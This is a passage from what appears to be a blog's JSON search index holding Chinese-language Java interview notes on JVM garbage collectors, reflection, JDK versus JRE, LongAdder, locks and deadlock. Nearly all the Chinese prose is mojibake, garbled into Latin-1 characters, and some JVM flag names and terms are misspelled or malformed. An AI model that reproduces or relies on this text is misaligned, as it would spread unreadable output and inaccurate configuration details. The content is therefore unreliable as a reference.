worldã€‚åˆ°ç°åœ¨ä¸ºæ­¢ï¼Œå®ƒä¾ç„¶æ˜¯è™šæ‹Ÿæœºè¿è¡Œåœ¨clientæ¨¡å¼ä¸‹çš„é»˜è®¤æ–°ç”Ÿä»£æ”¶é›†å™¨ï¼Œä¸å…¶ä»–æ”¶é›†å™¨ç›¸æ¯”ï¼Œå¯¹äºé™å®šåœ¨å•ä¸ªCPUçš„è¿è¡Œç¯å¢ƒæ¥è¯´ï¼ŒSerialæ”¶é›†å™¨ç”±äºæ²¡æœ‰çº¿ç¨‹äº¤äº’çš„å¼€é”€ï¼Œä¸“å¿ƒåšåƒåœ¾å›æ”¶è‡ªç„¶å¯ä»¥è·å¾—æœ€é«˜çš„å•çº¿ç¨‹æ”¶é›†æ•ˆç‡ã€‚ Serial Oldæ˜¯Serialæ”¶é›†å™¨çš„è€å¹´ä»£ç‰ˆæœ¬ï¼Œå®ƒåŒæ ·æ˜¯ä¸€ä¸ªå•çº¿ç¨‹æ”¶é›†å™¨ï¼Œä½¿ç”¨â€æ ‡è®°ï¼æ•´ç†â€œç®—æ³•ã€‚è¿™ä¸ªæ”¶é›†å™¨çš„ä¸»è¦æ„ä¹‰ä¹Ÿæ˜¯è¢«Clientæ¨¡å¼ä¸‹çš„è™šæ‹Ÿæœºä½¿ç”¨ã€‚åœ¨Serveræ¨¡å¼ä¸‹ï¼Œå®ƒä¸»è¦è¿˜æœ‰ä¸¤å¤§ç”¨é€”ï¼šä¸€ä¸ªæ˜¯åœ¨JDK1.5åŠä»¥å‰çš„ç‰ˆæœ¬ä¸­ä¸Parallel Scanvengeæ”¶é›†å™¨æ­é…ä½¿ç”¨ï¼Œå¦å¤–ä¸€ä¸ªå°±æ˜¯ä½œä¸ºCMSæ”¶é›†å™¨çš„åå¤‡é¢„æ¡ˆï¼Œåœ¨å¹¶å‘æ”¶é›†å‘ç”ŸConcurrent Mode Failureçš„æ—¶å€™ä½¿ç”¨ã€‚ é€šè¿‡æŒ‡å®š-UseSerialGCå‚æ•°ï¼Œä½¿ç”¨Serial + Serial Oldçš„ä¸²è¡Œæ”¶é›†å™¨ç»„åˆè¿›è¡Œå†…å­˜å›æ”¶ã€‚ ParNewæ”¶é›†å™¨ ParNewæ”¶é›†å™¨æ˜¯Serialæ”¶é›†å™¨æ–°ç”Ÿä»£çš„å¤šçº¿ç¨‹å®ç°ï¼Œæ³¨æ„åœ¨è¿›è¡Œåƒåœ¾å›æ”¶çš„æ—¶å€™ä¾ç„¶ä¼šstop the worldï¼Œåªæ˜¯ç›¸æ¯”è¾ƒSerialæ”¶é›†å™¨è€Œè¨€å®ƒä¼šè¿è¡Œå¤šæ¡è¿›ç¨‹è¿›è¡Œåƒåœ¾å›æ”¶ã€‚ ParNewæ”¶é›†å™¨åœ¨å•CPUçš„ç¯å¢ƒä¸­ç»å¯¹ä¸ä¼šæœ‰æ¯”Serialæ”¶é›†å™¨æ›´å¥½çš„æ•ˆæœï¼Œç”šè‡³ç”±äºå­˜åœ¨çº¿ç¨‹äº¤äº’çš„å¼€é”€ï¼Œè¯¥æ”¶é›†å™¨åœ¨é€šè¿‡è¶…çº¿ç¨‹æŠ€æœ¯å®ç°çš„ä¸¤ä¸ªCPUçš„ç¯å¢ƒä¸­éƒ½ä¸èƒ½ç™¾åˆ†ä¹‹ç™¾çš„ä¿è¯èƒ½è¶…è¶ŠSerialæ”¶é›†å™¨ã€‚å½“ç„¶ï¼Œéšç€å¯ä»¥ä½¿ç”¨çš„CPUçš„æ•°é‡å¢åŠ ï¼Œå®ƒå¯¹äºGCæ—¶ç³»ç»Ÿèµ„æºçš„åˆ©ç”¨è¿˜æ˜¯å¾ˆæœ‰å¥½å¤„çš„ã€‚å®ƒé»˜è®¤å¼€å¯çš„æ”¶é›†çº¿ç¨‹æ•°ä¸CPUçš„æ•°é‡ç›¸åŒï¼Œåœ¨CPUéå¸¸å¤šï¼ˆè­¬å¦‚32ä¸ªï¼Œç°åœ¨CPUåŠ¨è¾„4æ ¸åŠ è¶…çº¿ç¨‹ï¼ŒæœåŠ¡å™¨è¶…è¿‡32ä¸ªé€»è¾‘CPUçš„æƒ…å†µè¶Šæ¥è¶Šå¤šäº†ï¼‰çš„ç¯å¢ƒä¸‹ï¼Œå¯ä»¥ä½¿ç”¨-XX:ParallelGCThreadså‚æ•°æ¥é™åˆ¶åƒåœ¾æ”¶é›†çš„çº¿ç¨‹æ•°ã€‚ -UseParNewGC: æ‰“å¼€æ­¤å¼€å…³åï¼Œä½¿ç”¨ParNew + Serial Oldçš„æ”¶é›†å™¨ç»„åˆè¿›è¡Œå†…å­˜å›æ”¶ï¼Œè¿™æ ·æ–°ç”Ÿä»£ä½¿ç”¨å¹¶è¡Œæ”¶é›†å™¨ï¼Œè€å¹´ä»£ä½¿ç”¨ä¸²è¡Œæ”¶é›†å™¨ã€‚ Parallel Scavengeæ”¶é›†å™¨ Parallelæ˜¯é‡‡ç”¨å¤åˆ¶ç®—æ³•çš„å¤šçº¿ç¨‹æ–°ç”Ÿä»£åƒåœ¾å›æ”¶å™¨ï¼Œä¼¼ä¹å’ŒParNewæ”¶é›†å™¨æœ‰å¾ˆå¤šçš„ç›¸ä¼¼çš„åœ°æ–¹ã€‚ä½†æ˜¯Parallel Scanvengeæ”¶é›†å™¨çš„ä¸€ä¸ªç‰¹ç‚¹æ˜¯å®ƒæ‰€å…³æ³¨çš„ç›®æ ‡æ˜¯ååé‡(Throughput)ã€‚æ‰€è°“ååé‡å°±æ˜¯CPUç”¨äºè¿è¡Œç”¨æˆ·ä»£ç çš„æ—¶é—´ä¸CPUæ€»æ¶ˆè€—æ—¶é—´çš„æ¯”å€¼ï¼Œå³ååé‡=è¿è¡Œç”¨æˆ·ä»£ç æ—¶é—´ / (è¿è¡Œç”¨æˆ·ä»£ç æ—¶é—´ + åƒåœ¾æ”¶é›†æ—¶é—´)ã€‚åœé¡¿æ—¶é—´è¶ŠçŸ­å°±è¶Šé€‚åˆéœ€è¦ä¸ç”¨æˆ·äº¤äº’çš„ç¨‹åºï¼Œè‰¯å¥½çš„å“åº”é€Ÿåº¦èƒ½å¤Ÿæå‡ç”¨æˆ·çš„ä½“éªŒï¼›è€Œé«˜ååé‡åˆ™å¯ä»¥æœ€é«˜æ•ˆç‡åœ°åˆ©ç”¨CPUæ—¶é—´ï¼Œå°½å¿«åœ°å®Œæˆç¨‹åºçš„è¿ç®—ä»»åŠ¡ï¼Œä¸»è¦é€‚åˆåœ¨åå°è¿ç®—è€Œä¸éœ€è¦å¤ªå¤šäº¤äº’çš„ä»»åŠ¡ã€‚ Parallel Oldæ”¶é›†å™¨æ˜¯Parallel Scavengeæ”¶é›†å™¨çš„è€å¹´ä»£ç‰ˆæœ¬ï¼Œé‡‡ç”¨å¤šçº¿ç¨‹å’Œâ€æ ‡è®°ï¼æ•´ç†â€ç®—æ³•ã€‚è¿™ä¸ªæ”¶é›†å™¨æ˜¯åœ¨jdk1.6ä¸­æ‰å¼€å§‹æä¾›çš„ï¼Œåœ¨æ­¤ä¹‹å‰ï¼Œæ–°ç”Ÿä»£çš„Parallel Scavengeæ”¶é›†å™¨ä¸€ç›´å¤„äºæ¯”è¾ƒå°´å°¬çš„çŠ¶æ€ã€‚åŸå› æ˜¯å¦‚æœæ–°ç”Ÿä»£Parallel Scavengeæ”¶é›†å™¨ï¼Œé‚£ä¹ˆè€å¹´ä»£é™¤äº†Serial Old(PS MarkSweep)æ”¶é›†å™¨å¤–åˆ«æ— é€‰æ‹©ã€‚ç”±äºå•çº¿ç¨‹çš„è€å¹´ä»£Serial Oldæ”¶é›†å™¨åœ¨æœåŠ¡ç«¯åº”ç”¨æ€§èƒ½ä¸Šçš„â€æ‹–ç´¯â€œï¼Œå³ä½¿ä½¿ç”¨äº†Parallel Scavengeæ”¶é›†å™¨ä¹Ÿæœªå¿…èƒ½åœ¨æ•´ä½“åº”ç”¨ä¸Šè·å¾—ååé‡æœ€å¤§åŒ–çš„æ•ˆæœï¼Œåˆå› ä¸ºè€å¹´ä»£æ”¶é›†ä¸­æ— æ³•å……åˆ†åˆ©ç”¨æœåŠ¡å™¨å¤šCPUçš„å¤„ç†èƒ½åŠ›ï¼Œåœ¨è€å¹´ä»£å¾ˆå¤§è€Œä¸”ç¡¬ä»¶æ¯”è¾ƒé«˜çº§çš„ç¯å¢ƒä¸­ï¼Œè¿™ç§ç»„åˆçš„ååé‡ç”šè‡³è¿˜ä¸ä¸€å®šæœ‰ParNewåŠ CMSçš„ç»„åˆâ€ç»™åŠ›â€œã€‚ç›´åˆ°Parallel Oldæ”¶é›†å™¨å‡ºç°åï¼Œâ€ååé‡ä¼˜å…ˆâ€œæ”¶é›†å™¨ç»ˆäºæœ‰äº†æ¯”è¾ƒåå‰¯å…¶å®çš„åº”ç”¨ç¥è´ºï¼Œåœ¨æ³¨é‡ååé‡åŠCPUèµ„æºæ•æ„Ÿçš„åœºåˆï¼Œéƒ½å¯ä»¥ä¼˜å…ˆè€ƒè™‘Parallel ScavengeåŠ Parallel Oldæ”¶é›†å™¨ã€‚ -UseParallelGC: è™šæ‹Ÿæœºè¿è¡Œåœ¨Serveræ¨¡å¼ä¸‹çš„é»˜è®¤å€¼ï¼Œæ‰“å¼€æ­¤å¼€å…³åï¼Œä½¿ç”¨Parallel Scavenge + Serial Oldçš„æ”¶é›†å™¨ç»„åˆè¿›è¡Œå†…å­˜å›æ”¶ã€‚-UseParallelOldGC: æ‰“å¼€æ­¤å¼€å…³åï¼Œä½¿ç”¨Parallel Scavenge + Parallel Oldçš„æ”¶é›†å™¨ç»„åˆè¿›è¡Œåƒåœ¾å›æ”¶ CMSæ”¶é›†å™¨ CMS(Concurrent Mark Swep)æ”¶é›†å™¨æ˜¯ä¸€ä¸ªæ¯”è¾ƒé‡è¦çš„å›æ”¶å™¨ï¼Œç°åœ¨åº”ç”¨éå¸¸å¹¿æ³›ï¼Œæˆ‘ä»¬é‡ç‚¹æ¥çœ‹ä¸€ä¸‹ï¼ŒCMSä¸€ç§è·å–æœ€çŸ­å›æ”¶åœé¡¿æ—¶é—´ä¸ºç›®æ ‡çš„æ”¶é›†å™¨ï¼Œè¿™ä½¿å¾—å®ƒå¾ˆé€‚åˆç”¨äºå’Œç”¨æˆ·äº¤äº’çš„ä¸šåŠ¡ã€‚ä»åå­—(Mark Swep)å°±å¯ä»¥çœ‹å‡ºï¼ŒCMSæ”¶é›†å™¨æ˜¯åŸºäºæ ‡è®°æ¸…é™¤ç®—æ³•å®ç°çš„ã€‚å®ƒçš„æ”¶é›†è¿‡ç¨‹åˆ†ä¸ºå››ä¸ªæ­¥éª¤ï¼š åˆå§‹æ ‡è®°(initial mark) å¹¶å‘æ ‡è®°(concurrent mark) é‡æ–°æ ‡è®°(remark) å¹¶å‘æ¸…é™¤(concurrent sweep) æ³¨æ„åˆå§‹æ ‡è®°å’Œé‡æ–°æ ‡è®°è¿˜æ˜¯ä¼šstop the worldï¼Œä½†æ˜¯åœ¨è€—è´¹æ—¶é—´æ›´é•¿çš„å¹¶å‘æ ‡è®°å’Œå¹¶å‘æ¸…é™¤ä¸¤ä¸ªé˜¶æ®µéƒ½å¯ä»¥å’Œç”¨æˆ·è¿›ç¨‹åŒæ—¶å·¥ä½œã€‚ G1æ”¶é›†å™¨ G1æ”¶é›†å™¨æ˜¯ä¸€æ¬¾é¢å‘æœåŠ¡ç«¯åº”ç”¨çš„åƒåœ¾æ”¶é›†å™¨ã€‚HotSpotå›¢é˜Ÿèµ‹äºˆå®ƒçš„ä½¿å‘½æ˜¯åœ¨æœªæ¥æ›¿æ¢æ‰JDK1.5ä¸­å‘å¸ƒçš„CMSæ”¶é›†å™¨ã€‚ä¸å…¶ä»–GCæ”¶é›†å™¨ç›¸æ¯”ï¼ŒG1å…·å¤‡å¦‚ä¸‹ç‰¹ç‚¹ï¼š å¹¶è¡Œä¸å¹¶å‘ï¼šG1èƒ½æ›´å……åˆ†çš„åˆ©ç”¨CPUï¼Œå¤šæ ¸ç¯å¢ƒä¸‹çš„ç¡¬ä»¶ä¼˜åŠ¿æ¥ç¼©çŸ­stop the worldçš„åœé¡¿æ—¶é—´ã€‚ åˆ†ä»£æ”¶é›†ï¼šå’Œå…¶ä»–æ”¶é›†å™¨ä¸€æ ·ï¼Œåˆ†ä»£çš„æ¦‚å¿µåœ¨G1ä¸­ä¾ç„¶å­˜åœ¨ï¼Œä¸è¿‡G1ä¸éœ€è¦å…¶ä»–çš„åƒåœ¾å›æ”¶å™¨çš„é…åˆå°±å¯ä»¥ç‹¬è‡ªç®¡ç†æ•´ä¸ªGCå †ã€‚ ç©ºé—´æ•´åˆï¼šG1æ”¶é›†å™¨æœ‰åˆ©äºç¨‹åºé•¿æ—¶é—´è¿è¡Œï¼Œåˆ†é…å¤§å¯¹è±¡æ—¶ä¸ä¼šæ— æ³•å¾—åˆ°è¿ç»­çš„ç©ºé—´è€Œæå‰è§¦å‘ä¸€æ¬¡GCã€‚ å¯é¢„æµ‹çš„éåœé¡¿ï¼šè¿™æ˜¯G1ç›¸å¯¹äºCMSçš„å¦ä¸€å¤§ä¼˜åŠ¿ï¼Œé™ä½åœé¡¿æ—¶é—´æ˜¯G1å’ŒCMSå…±åŒçš„å…³æ³¨ç‚¹ï¼Œèƒ½è®©ä½¿ç”¨è€…æ˜ç¡®æŒ‡å®šåœ¨ä¸€ä¸ªé•¿åº¦ä¸ºMæ¯«ç§’çš„æ—¶é—´ç‰‡æ®µå†…ï¼Œæ¶ˆè€—åœ¨åƒåœ¾æ”¶é›†ä¸Šçš„æ—¶é—´ä¸å¾—è¶…è¿‡Næ¯«ç§’ã€‚ CMSï¼šé‡‡ç”¨æ ‡è®°æ¸…é™¤ç®—æ³• è§£å†³è¿™ä¸ªé—®é¢˜çš„åŠæ³•å°±æ˜¯å¯ä»¥è®©CMSåœ¨è¿›è¡Œä¸€å®šæ¬¡æ•°çš„Full GCï¼ˆæ ‡è®°æ¸…é™¤ï¼‰çš„æ—¶å€™è¿›è¡Œä¸€æ¬¡æ ‡è®°æ•´ç†ç®—æ³•ï¼ŒCMSæä¾›äº†ä»¥ä¸‹å‚æ•°æ¥æ§åˆ¶ï¼š -XX:UseCMSCompactAtFullCollection -XX:CMSFullGCBeforeCompaction=5 ä¹Ÿå°±æ˜¯CMSåœ¨è¿›è¡Œ5æ¬¡Full GCï¼ˆæ ‡è®°æ¸…é™¤ï¼‰ä¹‹åè¿›è¡Œä¸€æ¬¡æ ‡è®°æ•´ç†ç®—æ³•ï¼Œä»è€Œå¯ä»¥æ§åˆ¶è€å¹´å¸¦çš„ç¢ç‰‡åœ¨ä¸€å®šçš„æ•°é‡ä»¥å†…ï¼Œç”šè‡³å¯ä»¥é…ç½®CMSåœ¨æ¯æ¬¡Full GCçš„æ—¶å€™éƒ½è¿›è¡Œå†…å­˜çš„æ•´ç†ã€‚","categories":[],"tags":[{"name":"Interview","slug":"Interview","permalink":"https://blog.kayleh.top/tags/Interview/"}]},{"title":"Reflection","slug":"Reflection","date":"2020-07-13T21:33:21.000Z","updated":"2021-04-11T17:11:28.365Z","comments":true,"path":"Reflection/","link":"","permalink":"https://blog.kayleh.top/Reflection/","excerpt":"Reflection","text":"Reflection è¯´æ˜ä¸€ä¸‹JAVAä¸­åå°„çš„å®ç°è¿‡ç¨‹å’Œä½œç”¨åˆ†åˆ«æ˜¯ä»€ä¹ˆï¼ŸJAVAè¯­è¨€ç¼–è¯‘ä¹‹åä¼šç”Ÿæˆä¸€ä¸ª.classæ–‡ä»¶ï¼Œåå°„å°±æ˜¯é€šè¿‡å­—èŠ‚ç æ–‡ä»¶æ‰¾åˆ°æŸä¸€ä¸ªç±»ã€ç±»ä¸­çš„æ–¹æ³•ä»¥åŠå±æ€§ç­‰ã€‚åå°„çš„å®ç°ä¸»è¦å€ŸåŠ©ä»¥ä¸‹å››ä¸ªç±»ï¼š Classï¼šç±»çš„å¯¹è±¡ï¼Œ Constructorï¼šç±»çš„æ„é€ æ–¹æ³•ï¼Œ Fieldï¼šç±»ä¸­çš„å±æ€§å¯¹è±¡ï¼Œ Methodï¼šç±»ä¸­çš„æ–¹æ³•å¯¹è±¡ã€‚ ä½œç”¨ï¼šåå°„æœºåˆ¶æŒ‡çš„æ˜¯ç¨‹åºåœ¨è¿è¡Œæ—¶èƒ½å¤Ÿè·å–è‡ªèº«çš„ä¿¡æ¯ã€‚åœ¨JAVAä¸­ï¼Œåªè¦ç»™å®šç±»çš„åå­—ï¼Œé‚£ä¹ˆå°±å¯ä»¥é€šè¿‡åå°„æœºåˆ¶æ¥è·å–ç±»çš„æ‰€æœ‰ä¿¡æ¯ã€‚","categories":[],"tags":[{"name":"Interview","slug":"Interview","permalink":"https://blog.kayleh.top/tags/Interview/"}]},{"title":"JDK","slug":"JDK","date":"2020-07-13T21:32:29.000Z","updated":"2021-04-11T17:11:28.214Z","comments":true,"path":"JDK/","link":"","permalink":"https://blog.kayleh.top/JDK/","excerpt":"JDK","text":"JDK è¯·é—®JDKå’ŒJREçš„åŒºåˆ«æ˜¯ä»€ä¹ˆï¼ŸJavaè¿è¡Œæ—¶ç¯å¢ƒ(JRE)æ˜¯å°†è¦æ‰§è¡ŒJavaç¨‹åºçš„Javaè™šæ‹Ÿæœºã€‚å®ƒåŒæ—¶ä¹ŸåŒ…å«äº†æ‰§è¡Œappletéœ€è¦çš„æµè§ˆå™¨æ’ä»¶ã€‚Javaå¼€å‘å·¥å…·åŒ…(JDK)æ˜¯å®Œæ•´çš„Javaè½¯ä»¶å¼€å‘åŒ…ï¼ŒåŒ…å«äº†JREï¼Œç¼–è¯‘å™¨å’Œå…¶ä»–çš„å·¥å…·(æ¯”å¦‚ï¼šJavaDocï¼ŒJavaè°ƒè¯•å™¨)ï¼Œå¯ä»¥è®©å¼€å‘è€…å¼€å‘ã€ç¼–è¯‘ã€æ‰§è¡ŒJavaåº”ç”¨ç¨‹åºã€‚ Javaä¸­çš„LongAdderå’ŒAtomicLongæœ‰ä»€ä¹ˆåŒºåˆ«ï¼ŸJDK1.8å¼•å…¥äº†LongAdderç±»ã€‚CASæœºåˆ¶å°±æ˜¯ï¼Œåœ¨ä¸€ä¸ªæ­»å¾ªç¯å†…ï¼Œä¸æ–­å°è¯•ä¿®æ”¹ç›®æ ‡å€¼ï¼Œç›´åˆ°ä¿®æ”¹æˆåŠŸã€‚å¦‚æœç«äº‰ä¸æ¿€çƒˆï¼Œé‚£ä¹ˆä¿®æ”¹æˆåŠŸçš„æ¦‚ç‡å°±å¾ˆé«˜ï¼Œå¦åˆ™ï¼Œä¿®æ”¹å¤±è´¥çš„çš„æ¦‚ç‡å°±å¾ˆé«˜ï¼Œåœ¨å¤§é‡ä¿®æ”¹å¤±è´¥æ—¶ï¼Œè¿™äº›åŸå­æ“ä½œå°±ä¼šè¿›è¡Œå¤šæ¬¡å¾ªç¯å°è¯•ï¼Œå› æ­¤æ€§èƒ½å°±ä¼šå—åˆ°å½±å“ã€‚ ç»“åˆConcurrentHashMapçš„å®ç°æ€æƒ³ï¼Œåº”è¯¥å¯ä»¥æƒ³åˆ°å¯¹ä¸€ç§ä¼ ç»ŸAtomicIntegerç­‰åŸå­ç±»çš„æ”¹è¿›æ€è·¯ã€‚è™½ç„¶CASæ“ä½œæ²¡æœ‰é”ï¼Œä½†æ˜¯åƒå‡å°‘ç²’åº¦è¿™ç§åˆ†ç¦»çƒ­ç‚¹çš„æ€æƒ³ä¾ç„¶å¯ä»¥ä½¿ç”¨ã€‚å°†AtomicIntegerçš„å†…éƒ¨æ ¸å¿ƒæ•°æ®valueåˆ†ç¦»æˆä¸€ä¸ªæ•°ç»„ï¼Œæ¯ä¸ªçº¿ç¨‹è®¿é—®æ—¶ï¼Œé€šè¿‡å“ˆå¸Œç­‰ç®—æ³•æ˜ å°„åˆ°å…¶ä¸­ä¸€ä¸ªæ•°å­—è¿›è¡Œè®¡æ•°ï¼Œè€Œæœ€ç»ˆçš„è®¡æ•°ç»“æœï¼Œåˆ™ä¸ºè¿™ä¸ªæ•°ç»„çš„æ±‚å’Œç´¯åŠ ã€‚çƒ­ç‚¹æ•°æ®valueè¢«åˆ†ç¦»æˆå¤šä¸ªå•å…ƒcellï¼Œæ¯ä¸ªcellç‹¬è‡ªç»´æŠ¤å†…éƒ¨çš„å€¼ï¼Œå½“å‰å¯¹è±¡çš„å®é™…å€¼ç”±æ‰€æœ‰çš„cellç´¯è®¡åˆæˆï¼Œè¿™æ ·çƒ­ç‚¹å°±è¿›è¡Œäº†æœ‰æ•ˆçš„åˆ†ç¦»ï¼Œæé«˜äº†å¹¶è¡Œåº¦ã€‚","categories":[],"tags":[{"name":"Interview","slug":"Interview","permalink":"https://blog.kayleh.top/tags/Interview/"}]},{"title":"Lock","slug":"Lock","date":"2020-07-13T21:31:29.000Z","updated":"2021-04-11T17:11:28.302Z","comments":true,"path":"Lock/","link":"","permalink":"https://blog.kayleh.top/Lock/","excerpt":"LOCK","text":"LOCK ç®€è¿°ä¸€ä¸‹synchronizedä¸java.util.concurrent.locks.Lockçš„ç›¸åŒä¹‹å¤„å’Œä¸åŒä¹‹å¤„ï¼Ÿä¸»è¦ç›¸åŒç‚¹ï¼šLockèƒ½å®Œæˆsynchronizedæ‰€å®ç°çš„æ‰€æœ‰åŠŸèƒ½ä¸»è¦ä¸åŒç‚¹ï¼šLockæœ‰æ¯”synchronizedæ›´ç²¾ç¡®çš„çº¿ç¨‹è¯­ä¹‰å’Œæ›´å¥½çš„æ€§èƒ½ã€‚synchronizedä¼šè‡ªåŠ¨é‡Šæ”¾é”ï¼Œè€ŒLockä¸€å®šè¦æ±‚ç¨‹åºå‘˜æ‰‹å·¥é‡Šæ”¾ï¼Œå¹¶ä¸”å¿…é¡»åœ¨finallyä»å¥ä¸­é‡Šæ”¾ã€‚ JAVAä¸­å¦‚ä½•ç¡®ä¿Nä¸ªçº¿ç¨‹å¯ä»¥è®¿é—®Nä¸ªèµ„æºï¼Œä½†åŒæ—¶åˆä¸å¯¼è‡´æ­»é”ï¼Ÿä½¿ç”¨å¤šçº¿ç¨‹çš„æ—¶å€™ï¼Œä¸€ç§éå¸¸ç®€å•çš„é¿å…æ­»é”çš„æ–¹å¼å°±æ˜¯ï¼š æŒ‡å®šè·å–é”çš„é¡ºåºï¼Œå¹¶å¼ºåˆ¶çº¿ç¨‹æŒ‰ç…§æŒ‡å®šçš„é¡ºåºè·å–é”ã€‚å› æ­¤ï¼Œå¦‚æœæ‰€æœ‰çš„çº¿ç¨‹éƒ½æ˜¯ä»¥åŒæ ·çš„é¡ºåºåŠ é”å’Œé‡Šæ”¾é”ï¼Œå°±ä¸ä¼šå‡ºç°æ­»é”äº†ã€‚ é¢„é˜²æ­»é”ï¼Œé¢„å…ˆç ´åäº§ç”Ÿæ­»é”çš„å››ä¸ªæ¡ä»¶ã€‚äº’æ–¥ä¸å¯èƒ½ç ´åï¼Œæ‰€ä»¥æœ‰å¦‚ä¸‹ä¸‰ç§æ–¹æ³•ï¼š 1.ç ´åè¯·æ±‚å’Œä¿æŒæ¡ä»¶ï¼Œè¿›ç¨‹å¿…é¡»ç­‰æ‰€æœ‰è¦è¯·æ±‚çš„èµ„æºéƒ½ç©ºé—²æ—¶æ‰èƒ½ç”³è¯·èµ„æºï¼Œè¿™ç§æ–¹æ³•ä¼šä½¿èµ„æºæµªè´¹ä¸¥é‡(æœ‰äº›èµ„æºå¯èƒ½ä»…åœ¨è¿è¡ŒåˆæœŸæˆ–ç»“æŸæ—¶æ‰ä½¿ç”¨ï¼Œç”šè‡³æ ¹æœ¬ä¸ä½¿ç”¨). å…è®¸è¿›ç¨‹è·å–åˆæœŸæ‰€éœ€èµ„æºåï¼Œä¾¿å¼€å§‹è¿è¡Œï¼Œè¿è¡Œè¿‡ç¨‹ä¸­å†é€æ­¥é‡Šæ”¾è‡ªå·±å æœ‰çš„èµ„æºï¼Œæ¯”å¦‚æœ‰ä¸€ä¸ªè¿›ç¨‹çš„ä»»åŠ¡æ˜¯æŠŠæ•°æ®å¤åˆ¶åˆ°ç£ç›˜ä¸­å†æ‰“å°ï¼Œå‰æœŸåªéœ€è·å¾—ç£ç›˜èµ„æºè€Œä¸éœ€è¦è·å¾—æ‰“å°æœºèµ„æºï¼Œå¾…å¤åˆ¶å®Œæ¯•åå†é‡Šæ”¾æ‰ç£ç›˜èµ„æºã€‚è¿™ç§æ–¹æ³•æ¯”ç¬¬ä¸€ç§æ–¹æ³•å¥½ï¼Œä¼šä½¿èµ„æºåˆ©ç”¨ç‡ä¸Šå‡ã€‚ 2.ç ´åä¸å¯æŠ¢å æ¡ä»¶ï¼Œè¿™ç§æ–¹æ³•ä»£ä»·å¤§ï¼Œå®ç°å¤æ‚ã€‚ 3.ç ´åå¾ªåç­‰å¾…æ¡ä»¶ï¼Œå¯¹å„è¿›ç¨‹è¯·æ±‚èµ„æºçš„é¡ºåºåšä¸€ä¸ªè§„å®šï¼Œé¿å…ç›¸äº’ç­‰å¾…ã€‚è¿™ç§æ–¹æ³•å¯¹èµ„æºçš„åˆ©ç”¨ç‡æ¯”å‰ä¸¤ç§éƒ½é«˜ï¼Œä½†æ˜¯å‰æœŸè¦ä¸ºè®¾å¤‡æŒ‡å®šåºå·ï¼Œæ–°è®¾å¤‡åŠ å…¥ä¼šæœ‰ä¸€ä¸ªé—®é¢˜ï¼Œå…¶æ¬¡å¯¹ç”¨æˆ·ç¼–ç¨‹ä¹Ÿæœ‰é™åˆ¶ã€‚ è¯·é—®ä»€ä¹ˆæ˜¯æ­»é”(deadlock)?ä¸¤ä¸ªçº¿ç¨‹æˆ–ä¸¤ä¸ªä»¥ä¸Šçº¿ç¨‹éƒ½åœ¨ç­‰å¾…å¯¹æ–¹æ‰§è¡Œå®Œæ¯•æ‰èƒ½ç»§ç»­å¾€ä¸‹æ‰§è¡Œçš„æ—¶å€™å°±å‘ç”Ÿäº†æ­»é”ã€‚ç»“æœå°±æ˜¯è¿™äº›çº¿ç¨‹éƒ½é™·å…¥äº†æ— é™çš„ç­‰å¾…ä¸­ã€‚ ä¾‹å¦‚ï¼Œå¦‚æœçº¿ç¨‹1é”ä½äº†Aï¼Œç„¶åå°è¯•å¯¹Bè¿›è¡ŒåŠ é”ï¼ŒåŒæ—¶çº¿ç¨‹2å·²ç»é”ä½äº†Bï¼Œæ¥ç€å°è¯•å¯¹Aè¿›è¡ŒåŠ é”ï¼Œè¿™æ—¶æ­»é”å°±å‘ç”Ÿäº†ã€‚çº¿ç¨‹1æ°¸è¿œå¾—ä¸åˆ°Bï¼Œçº¿ç¨‹2ä¹Ÿæ°¸è¿œå¾—ä¸åˆ°Aï¼Œå¹¶ä¸”å®ƒä»¬æ°¸è¿œä¹Ÿä¸ä¼šçŸ¥é“å‘ç”Ÿäº†è¿™æ ·çš„äº‹æƒ…ã€‚ä¸ºäº†å¾—åˆ°å½¼æ­¤çš„å¯¹è±¡ï¼ˆAå’ŒBï¼‰ï¼Œå®ƒä»¬å°†æ°¸è¿œé˜»å¡ä¸‹å»ã€‚è¿™ç§æƒ…å†µå°±æ˜¯ä¸€ä¸ªæ­»é”ã€‚ è¯´æ˜ä¸€ä¸‹é”å’ŒåŒæ­¥çš„åŒºåˆ«ã€‚ç”¨æ³•ä¸Šçš„ä¸åŒï¼šsynchronizedæ—¢å¯ä»¥åŠ åœ¨æ–¹æ³•ä¸Šï¼Œä¹Ÿå¯ä»¥åŠ è½½ç‰¹å®šä»£ç å—ä¸Šï¼Œè€Œlockéœ€è¦æ˜¾ç¤ºåœ°æŒ‡å®šèµ·å§‹ä½ç½®å’Œç»ˆæ­¢ä½ç½®ã€‚synchronizedæ˜¯æ‰˜ç®¡ç»™JVMæ‰§è¡Œçš„12ï¼Œlockçš„é”å®šæ˜¯é€šè¿‡ä»£ç å®ç°çš„ï¼Œå®ƒæœ‰æ¯”synchronizedæ›´ç²¾ç¡®çš„çº¿ç¨‹è¯­ä¹‰ã€‚æ€§èƒ½ä¸Šçš„ä¸åŒï¼šlockæ¥å£çš„å®ç°ç±»ReentrantLockï¼Œä¸ä»…å…·æœ‰å’Œsynchronizedç›¸åŒçš„å¹¶å‘æ€§å’Œå†…å­˜è¯­ä¹‰ï¼Œè¿˜å¤šäº†è¶…æ—¶çš„è·å–é”ã€å®šæ—¶é”ã€ç­‰å€™å’Œä¸­æ–­é”ç­‰ã€‚åœ¨ç«äº‰ä¸æ˜¯å¾ˆæ¿€çƒˆçš„æƒ…å†µä¸‹ï¼Œsynchronizedçš„æ€§èƒ½ä¼˜äºReentrantLockï¼Œç«äº‰æ¿€çƒˆçš„æƒ…å†µä¸‹synchronizedçš„æ€§èƒ½ä¼šä¸‹é™çš„éå¸¸å¿«ï¼Œè€ŒReentrantLockåˆ™åŸºæœ¬ä¸å˜ã€‚é”æœºåˆ¶ä¸åŒï¼šsynchronizedè·å–é”å’Œé‡Šæ”¾é”çš„æ–¹å¼éƒ½æ˜¯åœ¨å—ç»“æ„ä¸­ï¼Œå½“è·å–å¤šä¸ªé”æ—¶ï¼Œå¿…é¡»ä»¥ç›¸åçš„é¡ºåºé‡Šæ”¾ï¼Œå¹¶ä¸”æ˜¯è‡ªåŠ¨è§£é”ã€‚è€ŒLockåˆ™éœ€è¦å¼€å‘äººå‘˜æ‰‹åŠ¨é‡Šæ”¾ï¼Œå¹¶ä¸”å¿…é¡»åœ¨finallyä¸­é‡Šæ”¾ï¼Œå¦åˆ™ä¼šå¼•èµ·æ­»é”ã€‚ è¯·è¯´æ˜ä¸€ä¸‹synchronizedçš„å¯é‡å…¥æ€ä¹ˆå®ç°ã€‚ 